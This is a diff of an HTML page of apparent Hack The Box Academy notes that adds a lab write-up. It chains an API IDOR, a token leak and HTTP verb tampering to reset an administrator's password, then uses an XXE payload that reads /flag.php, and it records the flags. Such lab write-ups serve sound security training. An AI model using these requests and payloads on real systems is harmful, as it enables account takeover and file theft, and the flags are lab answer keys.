@@ -6905,6 +6905,8 @@
       
         
       
+        
+      
     
     
     
@@ -7533,6 +7535,27 @@
   
   <span class="md-ellipsis">
     HTB redeemer
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-resolute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB resolute
   </span>
   
 
@@ -25046,22 +25069,182 @@ To bypass the previous limitation, we can utilize <code>XML Parameter Entities<
 <p>Results: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}</p>
 <h3 id="skills-assessment_5">Skills Assessment</h3>
 <p>Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-333-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-333-1"><a id="__codelineno-333-1" name="__codelineno-333-1"></a>
+<p>We can enumerate user with the GET request:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-333-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-333-1"><a id="__codelineno-333-1" name="__codelineno-333-1"></a>GET /api.php/user/74 HTTP/1.1
 </span></code></pre></div></td></tr></table></div>
-<p>Results:</p>
+<p>After launching an Intruder attack we retrieve users from uid 1 to uid 100. We filter them out and get the user Administrator:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-334-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-334-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-334-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-334-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-334-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-334-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-334-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-334-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-334-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-334-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-334-1"><a id="__codelineno-334-1" name="__codelineno-334-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-334-2"><a id="__codelineno-334-2" name="__codelineno-334-2"></a>Date: Sun, 12 Jan 2025 21:42:51 GMT
+</span><span id="__span-334-3"><a id="__codelineno-334-3" name="__codelineno-334-3"></a>Server: Apache/2.4.41 (Ubuntu)
+</span><span id="__span-334-4"><a id="__codelineno-334-4" name="__codelineno-334-4"></a>Vary: Accept-Encoding
+</span><span id="__span-334-5"><a id="__codelineno-334-5" name="__codelineno-334-5"></a>Content-Length: 90
+</span><span id="__span-334-6"><a id="__codelineno-334-6" name="__codelineno-334-6"></a>Keep-Alive: timeout=5, max=93
+</span><span id="__span-334-7"><a id="__codelineno-334-7" name="__codelineno-334-7"></a>Connection: Keep-Alive
+</span><span id="__span-334-8"><a id="__codelineno-334-8" name="__codelineno-334-8"></a>Content-Type: text/html; charset=UTF-8
+</span><span id="__span-334-9"><a id="__codelineno-334-9" name="__codelineno-334-9"></a>
+</span><span id="__span-334-10"><a id="__codelineno-334-10" name="__codelineno-334-10"></a>{&quot;uid&quot;:&quot;52&quot;,&quot;username&quot;:&quot;a.corrales&quot;,&quot;full_name&quot;:&quot;Amor Corrales&quot;,&quot;company&quot;:&quot;Administrator&quot;}
+</span></code></pre></div></td></tr></table></div>
+<p>We observe that we can change our password. But also, by retrieving the token for any other user with:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-335-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-335-1"><a id="__codelineno-335-1" name="__codelineno-335-1"></a>GET /api.php/token/52
+</span></code></pre></div></td></tr></table></div>
+<p>And for updating the password, the original request is:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-336-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-336-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-336-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-336-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-336-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-336-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-336-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-336-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-336-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-336-10">10</a></span>
+<span class="normal"><a href="#__codelineno-336-11">11</a></span>
+<span class="normal"><a href="#__codelineno-336-12">12</a></span>
+<span class="normal"><a href="#__codelineno-336-13">13</a></span>
+<span class="normal"><a href="#__codelineno-336-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-336-1"><a id="__codelineno-336-1" name="__codelineno-336-1"></a>POST /reset.php HTTP/1.1
+</span><span id="__span-336-2"><a id="__codelineno-336-2" name="__codelineno-336-2"></a>Host: 94.237.62.184:54493
+</span><span id="__span-336-3"><a id="__codelineno-336-3" name="__codelineno-336-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-336-4"><a id="__codelineno-336-4" name="__codelineno-336-4"></a>Accept: */*
+</span><span id="__span-336-5"><a id="__codelineno-336-5" name="__codelineno-336-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-336-6"><a id="__codelineno-336-6" name="__codelineno-336-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-336-7"><a id="__codelineno-336-7" name="__codelineno-336-7"></a>Referer: http://94.237.62.184:54493/settings.php
+</span><span id="__span-336-8"><a id="__codelineno-336-8" name="__codelineno-336-8"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-336-9"><a id="__codelineno-336-9" name="__codelineno-336-9"></a>Content-Length: 65
+</span><span id="__span-336-10"><a id="__codelineno-336-10" name="__codelineno-336-10"></a>Origin: http://94.237.62.184:54493
+</span><span id="__span-336-11"><a id="__codelineno-336-11" name="__codelineno-336-11"></a>Connection: keep-alive
+</span><span id="__span-336-12"><a id="__codelineno-336-12" name="__codelineno-336-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=74
+</span><span id="__span-336-13"><a id="__codelineno-336-13" name="__codelineno-336-13"></a>
+</span><span id="__span-336-14"><a id="__codelineno-336-14" name="__codelineno-336-14"></a>uid=74<span class="err">&amp;</span>token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26<span class="err">&amp;</span>password=lalala
+</span></code></pre></div></td></tr></table></div>
+<p>If we perform an HTTP verb tampering attack we can bypass the authorization restriction:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-337-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-337-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-337-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-337-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-337-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-337-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-337-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-337-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-337-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-337-10">10</a></span>
+<span class="normal"><a href="#__codelineno-337-11">11</a></span>
+<span class="normal"><a href="#__codelineno-337-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-337-1"><a id="__codelineno-337-1" name="__codelineno-337-1"></a>GET /reset.php?uid=52<span class="err">&amp;</span>token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c<span class="err">&amp;</span>password=lalala HTTP/1.1
+</span><span id="__span-337-2"><a id="__codelineno-337-2" name="__codelineno-337-2"></a>Host: 94.237.62.184:54493
+</span><span id="__span-337-3"><a id="__codelineno-337-3" name="__codelineno-337-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-337-4"><a id="__codelineno-337-4" name="__codelineno-337-4"></a>Accept: */*
+</span><span id="__span-337-5"><a id="__codelineno-337-5" name="__codelineno-337-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-337-6"><a id="__codelineno-337-6" name="__codelineno-337-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-337-7"><a id="__codelineno-337-7" name="__codelineno-337-7"></a>Referer: http://94.237.62.184:54493/settings.php
+</span><span id="__span-337-8"><a id="__codelineno-337-8" name="__codelineno-337-8"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-337-9"><a id="__codelineno-337-9" name="__codelineno-337-9"></a>Content-Length: 0
+</span><span id="__span-337-10"><a id="__codelineno-337-10" name="__codelineno-337-10"></a>Origin: http://94.237.62.184:54493
+</span><span id="__span-337-11"><a id="__codelineno-337-11" name="__codelineno-337-11"></a>Connection: keep-alive
+</span><span id="__span-337-12"><a id="__codelineno-337-12" name="__codelineno-337-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=74
+</span></code></pre></div></td></tr></table></div>
+<p>We have updated the Administrator's password. Now we access to that account. We can see there is a new feature for creating an event. This is the original request that we send:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-338-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-338-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-338-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-338-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-338-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-338-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-338-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-338-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-338-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-338-10">10</a></span>
+<span class="normal"><a href="#__codelineno-338-11">11</a></span>
+<span class="normal"><a href="#__codelineno-338-12">12</a></span>
+<span class="normal"><a href="#__codelineno-338-13">13</a></span>
+<span class="normal"><a href="#__codelineno-338-14">14</a></span>
+<span class="normal"><a href="#__codelineno-338-15">15</a></span>
+<span class="normal"><a href="#__codelineno-338-16">16</a></span>
+<span class="normal"><a href="#__codelineno-338-17">17</a></span>
+<span class="normal"><a href="#__codelineno-338-18">18</a></span>
+<span class="normal"><a href="#__codelineno-338-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-338-1"><a id="__codelineno-338-1" name="__codelineno-338-1"></a>POST /addEvent.php HTTP/1.1
+</span><span id="__span-338-2"><a id="__codelineno-338-2" name="__codelineno-338-2"></a>Host: 94.237.62.184:54493
+</span><span id="__span-338-3"><a id="__codelineno-338-3" name="__codelineno-338-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-338-4"><a id="__codelineno-338-4" name="__codelineno-338-4"></a>Accept: */*
+</span><span id="__span-338-5"><a id="__codelineno-338-5" name="__codelineno-338-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-338-6"><a id="__codelineno-338-6" name="__codelineno-338-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-338-7"><a id="__codelineno-338-7" name="__codelineno-338-7"></a>Referer: http://94.237.62.184:54493/event.php
+</span><span id="__span-338-8"><a id="__codelineno-338-8" name="__codelineno-338-8"></a>Content-Type: text/plain;charset=UTF-8
+</span><span id="__span-338-9"><a id="__codelineno-338-9" name="__codelineno-338-9"></a>Content-Length: 163
+</span><span id="__span-338-10"><a id="__codelineno-338-10" name="__codelineno-338-10"></a>Origin: http://94.237.62.184:54493
+</span><span id="__span-338-11"><a id="__codelineno-338-11" name="__codelineno-338-11"></a>Connection: keep-alive
+</span><span id="__span-338-12"><a id="__codelineno-338-12" name="__codelineno-338-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=52
+</span><span id="__span-338-13"><a id="__codelineno-338-13" name="__codelineno-338-13"></a>
+</span><span id="__span-338-14"><a id="__codelineno-338-14" name="__codelineno-338-14"></a>
+</span><span id="__span-338-15"><a id="__codelineno-338-15" name="__codelineno-338-15"></a>            <span class="p">&lt;</span><span class="nt">root</span><span class="p">&gt;</span>
+</span><span id="__span-338-16"><a id="__codelineno-338-16" name="__codelineno-338-16"></a>            <span class="p">&lt;</span><span class="nt">name</span><span class="p">&gt;</span>Name of event<span class="p">&lt;/</span><span class="nt">name</span><span class="p">&gt;</span>
+</span><span id="__span-338-17"><a id="__codelineno-338-17" name="__codelineno-338-17"></a>            <span class="p">&lt;</span><span class="nt">details</span><span class="p">&gt;</span>lele<span class="p">&lt;/</span><span class="nt">details</span><span class="p">&gt;</span>
+</span><span id="__span-338-18"><a id="__codelineno-338-18" name="__codelineno-338-18"></a>            <span class="p">&lt;</span><span class="nt">date</span><span class="p">&gt;</span>2025-01-13<span class="p">&lt;/</span><span class="nt">date</span><span class="p">&gt;</span>
+</span><span id="__span-338-19"><a id="__codelineno-338-19" name="__codelineno-338-19"></a>            <span class="p">&lt;/</span><span class="nt">root</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Our payload:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-339-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-339-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-339-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-339-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-339-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-339-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-339-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-339-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-339-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-339-10">10</a></span>
+<span class="normal"><a href="#__codelineno-339-11">11</a></span>
+<span class="normal"><a href="#__codelineno-339-12">12</a></span>
+<span class="normal"><a href="#__codelineno-339-13">13</a></span>
+<span class="normal"><a href="#__codelineno-339-14">14</a></span>
+<span class="normal"><a href="#__codelineno-339-15">15</a></span>
+<span class="normal"><a href="#__codelineno-339-16">16</a></span>
+<span class="normal"><a href="#__codelineno-339-17">17</a></span>
+<span class="normal"><a href="#__codelineno-339-18">18</a></span>
+<span class="normal"><a href="#__codelineno-339-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-339-1"><a id="__codelineno-339-1" name="__codelineno-339-1"></a>POST /addEvent.php HTTP/1.1
+</span><span id="__span-339-2"><a id="__codelineno-339-2" name="__codelineno-339-2"></a>Host: 94.237.62.184:54493
+</span><span id="__span-339-3"><a id="__codelineno-339-3" name="__codelineno-339-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-339-4"><a id="__codelineno-339-4" name="__codelineno-339-4"></a>Accept: */*
+</span><span id="__span-339-5"><a id="__codelineno-339-5" name="__codelineno-339-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-339-6"><a id="__codelineno-339-6" name="__codelineno-339-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-339-7"><a id="__codelineno-339-7" name="__codelineno-339-7"></a>Referer: http://94.237.62.184:54493/event.php
+</span><span id="__span-339-8"><a id="__codelineno-339-8" name="__codelineno-339-8"></a>Content-Type: text/plain;charset=UTF-8
+</span><span id="__span-339-9"><a id="__codelineno-339-9" name="__codelineno-339-9"></a>Content-Length: 289
+</span><span id="__span-339-10"><a id="__codelineno-339-10" name="__codelineno-339-10"></a>Origin: http://94.237.62.184:54493
+</span><span id="__span-339-11"><a id="__codelineno-339-11" name="__codelineno-339-11"></a>Connection: keep-alive
+</span><span id="__span-339-12"><a id="__codelineno-339-12" name="__codelineno-339-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=52
+</span><span id="__span-339-13"><a id="__codelineno-339-13" name="__codelineno-339-13"></a>
+</span><span id="__span-339-14"><a id="__codelineno-339-14" name="__codelineno-339-14"></a><span class="cp">&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY example1 SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///flag.php&quot;&gt;</span> ]&gt;
+</span><span id="__span-339-15"><a id="__codelineno-339-15" name="__codelineno-339-15"></a>            <span class="p">&lt;</span><span class="nt">root</span><span class="p">&gt;</span>
+</span><span id="__span-339-16"><a id="__codelineno-339-16" name="__codelineno-339-16"></a>            <span class="p">&lt;</span><span class="nt">name</span><span class="p">&gt;</span><span class="ni">&amp;example1;</span><span class="p">&lt;/</span><span class="nt">name</span><span class="p">&gt;</span>
+</span><span id="__span-339-17"><a id="__codelineno-339-17" name="__codelineno-339-17"></a>            <span class="p">&lt;</span><span class="nt">details</span><span class="p">&gt;</span>lele<span class="p">&lt;/</span><span class="nt">details</span><span class="p">&gt;</span>
+</span><span id="__span-339-18"><a id="__codelineno-339-18" name="__codelineno-339-18"></a>            <span class="p">&lt;</span><span class="nt">date</span><span class="p">&gt;</span>2025-01-13<span class="p">&lt;/</span><span class="nt">date</span><span class="p">&gt;</span>
+</span><span id="__span-339-19"><a id="__codelineno-339-19" name="__codelineno-339-19"></a>            <span class="p">&lt;/</span><span class="nt">root</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p><img alt="" src="../img/xxe_28.png" /></p>
+<p>After decoding the response <code>PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K</code>
+we obtain: <code>&lt;?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?&gt;</code></p>
+<p>Results: HTB{m4573r_w3b_4774ck3r}</p>
 <h2 id="attacking-common-applications"><a href="https://academy.hackthebox.com/module/details/113">Attacking Common Applications</a></h2>
 <h2 id="linux-privilege-escalation"><a href="https://academy.hackthebox.com/module/details/51">Linux Privilege Escalation</a></h2>
 <h2 id="windows-privilege-escalation"><a href="https://academy.hackthebox.com/module/details/67">Windows Privilege Escalation</a></h2>
 <h2 id="documentation-reporting"><a href="https://academy.hackthebox.com/module/details/162">Documentation &amp; Reporting</a></h2>
 <h2 id="attacking-enterprise-networks"><a href="https://academy.hackthebox.com/module/details/163">Attacking Enterprise Networks</a></h2>
 <p>Question</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-334-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-334-1"><a id="__codelineno-334-1" name="__codelineno-334-1"></a>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-340-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-340-1"><a id="__codelineno-340-1" name="__codelineno-340-1"></a>
 </span></code></pre></div></td></tr></table></div>
 <p>Results: </p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-13T04:23:33+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-13</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-13T19:07:02+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-13</span></small></br>
 
 
     <small>Created: May 31, 2024 18:03:27</small>
